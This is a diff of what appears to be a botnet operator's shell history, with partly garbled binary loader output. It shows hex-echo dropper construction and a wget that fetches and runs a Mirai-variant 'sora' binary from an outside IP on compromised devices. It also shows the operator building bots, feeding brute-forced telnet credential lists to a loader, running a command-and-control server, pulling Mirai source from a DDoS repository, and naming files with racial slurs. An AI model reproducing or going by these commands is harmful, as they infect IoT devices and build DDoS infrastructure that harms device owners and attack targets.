@@ -1,304 +1,3 @@
-[FD92] �
-[FD284] ���
-writing echo -ne '\x00\x40\x00\x00\x00\x00\x06\x30\x00\x00\x06\x30\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x06\x30\x00\x44\x06\x30\x00\x44\x06\x30\x00\x00\x00\x54\x00\x00\x00\x70\x00\x00\x00\x06\x00\x01\x00\x00\x64\x74\xe5\x51\x00\x00\x00\x00\x00\x00\x00\x00' >> dropper; /bin/busybox SORA
-[FD24] �� ��
-����-0��)
-[FD316] �U���0��
-[FD326] 
-[FD479] + �#�#D
-[FD76] � ��0��
-[FD132]     -i      List inode numbers
-        -l      Long listing format
-        -n      List numeric UIDs and GIDs instead of names
-        -p      Append indicator (one of /=@|) to entries
-        -L      List entries pointed to by symlinks
-        -R      Recurse
-        -r      Sort in reverse order
-        -S      Sort by file size
-        -s      List the size of each file, in blocks
-        -T N    Assume tabstop every N columns
-        -t      With -l: sort by modification time
-        -u      With -l: sort by access time
-        -v      Sort by version
-        -w N    Assume the terminal is N columns wide
-        -x      List by lines
-        -X      Sort by extension
-[FD479] rdbuf_pos > 7168
-[FD479] 
-[FD132] rdbuf_pos > 7168
-[FD132] -A inet{6}      Select address family
-[FD77]  �
-[FD143] O
-`��413] 
-   �.�o*��D`��4`k
- �*���*���� "<eВ ��
-[FD80] �
-[FD70] 
-[FD365] `
-         @�P�p��@�*D�be)       �.*w�  �sH��-<��       ��`
-[FD365] rdbuf_pos > 7168
-[FD365] �*�b�u��
-                *�
-                  *�
-                    �:tFv*��'.*��*��*
-                                     ���`
-[FD325] ���������ƒ������
-
-[FD325] rdbuf_pos > 7168
-[FD447] Arch has ARMv7!
-[FD447] We do not have an ARMv7 binary, so we will try using default ARM
-writing /bin/busybox wget; /bin/busybox tftp; /bin/busybox SORA
-`��413] 
-   �.�o*��D`��4`k
- �*���*���� "<eВ ��
-[FD70] 
-[FD479] 
-[FD331] �
-[FD188] �
-[FD414] �w   
-[FD365] �*�b�u��
-                *�
-                  *�
-                    �:tFv*��'.*��*��*
-                                     ���`
-[FD365] �*�b�u��
-                *�
-                  *�
-                    �:tFv*��'.*��*��*
-                                     ���`
-[FD365] rdbuf_pos > 7168
-[FD365] �P�@�0� ��
-`��413] 
-   �.�o*��D`��4`k
- �*���*���� "<eВ ��
-[FD171] � +
-[FD479] 
-[FD331] �
-[FD132] -A inet{6}      Select address family
-[FD171] � +
-[FD132] -A inet{6}      Select address family
-[FD365] �P�@�0� ��
-[FD331] �
-[FD192] ��/
-[FD331] rdbuf_pos > 7168
-[FD335] ���
-[FD70] 
-[FD70] rdbuf_pos > 7168
-[FD132] -A inet{6}      Select address family
-[FD132] rdbuf_pos > 7168
-[FD414] �w   
-[FD70] ����$
-[FD335] ���
-[FD331] ���4�� �����8�� ��Č�
-                            �� ��0�����4�� ��Ȍ�8���� ����,��������
-[FD24] �� ��
-����-0��)
-[FD455] 1
-[FD455] 1
-[FD479] 
-[FD479] rdbuf_pos > 7168
-[FD331] ���4�� �����8�� ��Č�
-                            �� ��0�����4�� ��Ȍ�8���� ����,��������
-[FD455] 1
-[FD455] rdbuf_pos > 7168
-[FD455] _mode)
-[FD92] �
-[FD77]  �
-[FD350] 
-[FD350] rdbuf_pos > 7168
-[FD350] ��
-[FD77]  �
-[FD77] rdbuf_pos > 7168
-[FD77] �4��2� �T3F�c�4�
-[FD325] 
-[FD132] u%2u%2u%2u%c
-writing echo -ne '\x54\x50\x00\xeb\x04\x00\xa0\xe1\x2d\x50\x00\xeb\xf1\x3f\x00\xeb\x67\x3f\x00\xeb\x00\x00\x50\xe3\x67\x02\x00\xca\xe0\x0b\x9f\xe5\x35\x3f\x00\xeb\x00\x00\xa0\xe3\x4b\x3f\x00\xeb\x01\x00\xa0\xe3\x49\x3f\x00\xeb\x02\x00\xa0\xe3\x47\x3f\x00\xeb\xc4\x0b\x9f\xe5' >> dropper; /bin/busybox SORA
-[FD350] ��
-[FD132] u%2u%2u%2u%c
-writing echo -ne '\x5c\x40\x9f\xe5\x00\x30\xa0\xe1\x40\x10\xa0\xe3\x54\x20\x9f\xe5\x0d\x00\xa0\xe1\x97\x42\x00\xeb\x00\x00\x94\xe5\x01\x00\x70\xe3\xbd\x40\x00\x1b\x40\xc0\x9f\xe5\x01\x00\xa0\xe3\x00\x20\x9c\xe5\x00\x30\xe0\xe3\x10\x02\xa0\xe1\x00\x30\x84\xe5\x2c\x30\x9f\xe5' >> dropper; /bin/busybox SORA
-[FD337] ����
-[FD132] u%2u%2u%2u%c
-[FD77] �4��2� �T3F�c�4�
-[FD132] u%2u%2u%2u%c
-[FD77] �4��2� �T3F�c�4�
-[FD132] rdbuf_pos > 7168
-[FD132] s conflict
-[FD132] s conflict
-[FD350] ��
-[FD77] �4��2� �T3F�c�4�
-[FD350] ��
-[FD414] �w   
-writing echo -ne '\x13\xff\x2f\x11\x14\x37\x9f\xe5\x00\x00\x96\xe5\xac\x16\x9f\xe5\x10\x20\xa0\xe3\x00\x90\xc3\xe5\x82\x4a\x00\xeb\x00\x00\x50\xe3\xf8\x46\x9f\xe5\x06\x00\x00\x0a\x8b\x3f\x00\xeb\x00\x30\x90\xe5\x73\x00\x53\xe3\x27\xff\xff\x0a\x00\x00\x96\xe5\x06\x3e\x00\xeb' >> dropper; /bin/busybox SORA
-writing echo -ne '\x18\x30\x8d\xe2\x51\xce\x8d\xe2\x08\x30\x43\xe2\x08\xc0\x8c\xe2\x08\xc0\x4c\xe2\x0c\x30\x8d\xe5\x01\x1b\xa0\xe3\x0c\x30\xa0\xe1\xf4\x2e\x9f\xe5\x0c\x00\x9d\xe5\x00\xc0\x8d\xe5\x80\x10\x8d\xe9\x9f\x46\x00\xeb\x0c\x00\x9d\xe5\x84\x4b\x00\xeb\x0c\x10\x9d\xe5' >> dropper; /bin/busybox SORA
-[FD132] s conflict
-[FD132] s conflict
-[FD479] rdbuf_pos > 7168
-[FD350] ��
-[FD35
-[FD319] R
-�[FD275]
-[FD275] rdbuf_pos > 7168
-[FD275]
-[FD189] ���
-[FD479
-[FD132] s conflict
-[FD275]
-[FD132] rdbuf_pos > 
-[FD132] && 
-[FD334] 
-�[FD334] rdbuf_pos > 7168
-[FD350] 
-[FD275] !  (
-[FD132] && 
-[FD189] ���
-[FD275] !  (
-[FD334] 
-[FD132] && 
-[FD70] ����$
-[FD430] ���
-[FD325] 
-[FD70] ����$
-[FD70] rdbuf_pos > 7168
-[FD70] w
-[FD275] !  (
-[FD275] rdbuf_pos > 7168
-[FD275] �'(
-[FD405] L��$$���
-[FD405] rdbuf_pos > 7168
-[FD405] ����$$������C���$
-�[FD319] rdbuf_pos > 7168
-[FD275] �'(
-[FD118] ����$ ��
-[FD275] �'(
-[FD295] Succe
-Usage: wget [options] <URL>
-Options:
-sh: tftp: not found
-[@LocalHost:] $ /bin/busybox wget http://185.247.117.214:80/bins/sora.arm7 -O - > NiGGeR69xd; /bin/busybox chmod 777 NiGGeR69xd; /bin/busybox SORA
-ls
-cd bins
-ls
-cd bins
-ls
-cd ..
-cd loader/
-cd bins/
-ls
-lscd /root/boinker/loader/src && gcc -g -O0 -DDEBUG -Wall -Wextra -std=c99 -lpthread -o /root/boinker/loader main.c server.c connection.c binary.c util.c telnet_info.c
-cd /root/boinker/loader/src && gcc -g -O0 -DDEBUG -Wall -Wextra -std=c99 -lpthread -o /root/boinker/loader main.c server.c connection.c binary.c util.c telnet_info.c
-cd ..
-ls
-./loader < brute
-./loader < bruted.txt 
-clear
-ls
-cd /var/www/html/bins
-ls
-clear
-tail -f /var/log/httpd/access_log 
-cat /var/log/httpd/access_log 
-htop
-reboot
-cd /var/www/html
-ls
-cd bins
-ls
-rm *
-y
-cp ~/boinker/binaries/* .
-ls
-cd ..
-rm -rf bins
-mkdir bins
-cd bins/
-cp ~/boinker/binaries/* .
-ls
-cd ..
-rm bins/
-rm -rf  bins/
-mkdir bins
-cd bins/
-cp ~/boinker/binaries/* .
-ls
-rm test_binaries.sh 
-cls
-. "\root\.cursor-server\bin\3ccce8f55d8cca49f6d28b491a844c699b8719a0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
-cd /var/www/html/bins
-ls
-cd /root
-cd boinker/
-clear
-sh build_bot.sh 
-cd binaries/
-cp sora.i568 ~/
-ls
-./sora.arm
-./sora.ar5
-./sora.ar6
-./sora.ar7
-./sora.m68k 
-./sora.arm5 
-./sora.arm6
-./sora.arm7
-./sora.arm
-./sora.m68k 
-./sora.mips
-./sora.x86 
-ls
-rm *
-cd ..
-sh build_bot.sh 
-. "\root\.cursor-server\bin\3ccce8f55d8cca49f6d28b491a844c699b8719a0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
-cd boinker/cnc/
-./cnc
-ip a
-ls
-sh build_
-sh build_dlr.sh 
-ip a
-ip a
-cd /var/www/html/bins/
-ls
-rm test_binaries.sh 
-ls
-clea
-clear
-ls
-cd ~/
-clear
-ls
-cd boinker/
-ls
-;s
-ls
-sh build_dlr.sh 
-cd /var/www/html
-ls
-cd bins/
-ls
-rm d*
-cd ..
-cd /root
-cd boinker/
-cat /var/www/html/bins
-cd /var/www/html/bins
-ls
-rm dlr*
-clear
-ls
-cd ~/
-ls
-cd boinker/loader/
-ls
-./loader < bruted.txt 
-ls
-cd /var/www/html
-cd bins
-ls
-./sora.x86 
-dstat
-cd ~/
-ls
 cd boinker/binaries/
 ls
 ./sora.x86 
@@ -998,3 +697,304 @@ cd release/
 rm * -f
 ls
 . "\root\.cursor-server\bin\34881053400013f38e2354f1479c88c9067039a0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
+clear
+cd loader/
+touch list.txt
+nano list.txt
+./loader < list.txt 
+ip a
+cd ..
+cd release/
+ls
+rm * -f
+cd ..
+sh build.sh 
+cd loader/
+clear
+ls
+./loader list.txt 
+./loader < list.txt 
+ls
+cat list.txt | grep 112.28.79.69
+cat list.txt | grep 172.236.150.6
+cd cnc/
+./admin 
+cd dlr/
+nano main.c 
+tail -f /var/log/httpd/access_log 
+cd loader/
+cat list.txt | grep 85.248.223.2
+reboot
+cd release/
+rm * -f
+cd ..
+sh clear
+clear
+ls
+cd release/
+ls
+cd ..
+sh build.sh 
+git init
+echo "# divine-botnet-working" >> README.md
+git init
+git add README.md
+git commit -m "first commit"
+git branch -M main
+git remote add origin https://github.com/Thatdevnerd/divine-botnet-working.git
+git push -u origin main
+git config --global user.email "bas@bitsenbytes.org"
+git config --global user.name "thatdevnerd"
+git add -A
+git commit -m "working"
+git push
+echo "# divine-botnet-working" >> README.md
+git init
+git add README.md
+git commit -m "first commit"
+git branch -M main
+git remote add origin https://github.com/Thatdevnerd/divine-botnet-working.git
+git push -u origin main
+. "\root\.cursor-server\bin\34881053400013f38e2354f1479c88c9067039a0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
+cd cnc
+./admin
+dstat
+htop
+cd loader/
+nano brute.txt
+./loader < brute.txt 
+tail -f /var/log/httpd/access_log 
+cd cnc
+clear
+screen -dmS ./admin
+screen -dmS cnc ./admin
+screen -r cnc
+cd loader/
+nano big.txt
+./loader < big.txt 
+. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
+screen -r cnc
+ls
+cd cnc
+ls
+cd ..
+cd loader/
+s;
+;s
+ls
+sh start_scanlisten.sh 
+nano start_scanlisten.sh 
+./scanListen 
+ls
+rm list_*
+rm list_-f
+rm list_* -f
+clear
+ls
+rm telnet_* -f
+ls
+cd ..
+cd release/
+s
+ls
+cd /var/www/html/bins
+ls
+clear
+ls
+cd ~/
+cd loo
+cd loader/
+clear
+ls
+./scanListen_debug < big.txt 
+./loader < big.txt 
+ls
+./loader
+clear
+ls
+./scanListen < big.txt 
+nano debug_
+nano debug_20251001_053601.log 
+htop
+clear
+./loader
+./loader < big.txt 
+ls
+cd loader 
+ls
+rm big_* -f
+ls
+rm debug_* -f
+ls
+rm monitor_cnc_connections.sh optimize_scanlisten.sh fix_cnc_connection.sh improved_optimize.sh test_cnc_server.py test_debug.sh -f
+ls
+rm success_* -f
+ls
+rm simple_cnc_server.py scanListen_fixed start_debug_loader.sh start_debug -f
+ls
+rm scan* -f
+ls
+rm enhanced_clean.txt enhanced_targets.txt 
+ls
+clear
+./loader
+./loader < big.txt 
+ls
+cd ..
+clear
+cd cnc/
+./admin 
+screen -dmS cnc ./admin 
+screen -r
+tail -f /tmp/execution_tracking.log 
+clear
+clear
+ls
+clear
+tail -f /var/log/httpd/access_log 
+clear
+tail -f /var/log/httpd/access_log 
+clear
+cd /var/www/html/bins
+clea
+rls
+tail -f /var/log/httpd/access_log 
+clar
+clear
+ls
+cd ..
+cd /root
+mkdir cyka
+ls
+cd cyka/
+ls
+clear
+ls
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/Botnets/Mirai/%5BMIRAI%5D%20Cyka.zip
+unzip \[MIRAI\]\ Cyka.zip 
+ls
+cd \[MIRAI\]\ Cyka
+cler
+clear
+tail -f /var/log/httpd/access_log 
+cd ~/loader/
+. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
+cd loader
+ls
+./laoder < big.txt
+ls
+clear
+./loader < big.txt 
+screen -r cnc
+screen -r
+sh build.sh 
+./loader < big.txt 
+sh build.sh 
+clear
+sh build.sh 
+./loader < big.txt 
+sh build.sh 
+./loader < big.txt 
+sh build.sh 
+clear
+./loader < big.txt 
+screen -r
+cd ~/cnc
+./admin 
+pkill -f admin
+./admin 
+screen -r
+pkill -f admin
+clear
+screen -r
+./admin 
+. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
+cnc
+cd cnc
+clear
+./admin
+tail -f /var/log/httpd/access_log 
+clear
+ls
+clear
+ls
+cd /var/www/html
+ls
+nano nigger.sh 
+tail -f /var/log/httpd/access_log 
+cd loader/
+nano bruted.txt 
+./loader < bruted.txt 
+mv /var/www/html/nigger.sh ~/
+systemctl status firewalld
+. "\root\.cursor-server\bin\34881053400013f38e2354f1479c88c9067039a0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
+cd loader/
+nano aa.txt
+./loader <aa.txt 
+ip a
+ls
+nano list.txt 
+./loader < list.txt 
+htop
+./loader < list.txt 
+reboot
+clear
+cd ./loader/
+./loader
+cd /var/www/html/bins
+ls
+rm * -f
+ls
+cd /root
+sh build.sh 
+ls
+./upx
+clear
+sh build.sh 
+mv nigger.sh /var/www/html/bins/binsh.sh
+cd /var/www/html/bins/bins.sh
+cd /var/www/html/bins
+nano binsh.sh 
+ls
+nano binsh.sh 
+clear
+cd binsh.sh ~/
+ls
+mv binsh.sh bins.sh
+cp bins.sh ~/
+nano bins.sh 
+~/
+clear
+cd ~?
+cd ~/
+clear
+ls
+cd lo
+cd loader/
+python loader.py 
+python loader.py bruted.txt 
+nano bots.txt 
+python loader.py bruted.txt 
+. "\root\.cursor-server\bin\34881053400013f38e2354f1479c88c9067039a0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
+cd cnc
+./admin 
+ls
+./cnc_server 
+screen -dmS CNC ./cnc_server 
+screen -r CNC
+. "/root/.cursor-server/bin/867f14c797c14c23a187097ea179bc97d215a7c0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
+cd cnc/
+screen -dmS CNC ./cnc_server 
+screen -r CNC
+cd loader/
+./loader < list.txt 
+ls
+nano list.txt 
+./loader < list.txt 
+systemctl status httpd
+systemctl status firewalld
+. "\root\.cursor-server\bin\adb0f9e3e4f184bba7f3fa6dbfd72ad0ebb8cfd0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
+clear
+ls
+sh build.sh 
+. "\root\.cursor-server\bin\adb0f9e3e4f184bba7f3fa6dbfd72ad0ebb8cfd0/out/vs/workbench/contrib/terminal/common/scripts/shellIntegration-bash.sh"
